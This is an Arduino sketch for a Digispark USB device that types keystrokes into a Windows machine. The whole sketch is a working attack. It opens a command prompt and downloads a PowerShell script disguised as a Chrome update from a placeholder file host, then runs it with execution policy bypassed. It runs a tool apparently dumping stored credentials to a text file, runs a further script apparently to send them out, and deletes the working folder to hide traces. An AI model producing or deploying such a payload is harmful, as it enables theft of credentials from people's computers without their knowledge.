#include "DigiKeyboard.h"
/* Init function */
void setup()
{
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);  
  DigiKeyboard.println("cd / & mkdir chrome & cd chrome & echo (wget '(YOUR FILE HOST)/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.delay(20);  
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("update.exe /stext maintenance.txt");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell ./maintenance.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("cd C:/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("rmdir /s /q chrome");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
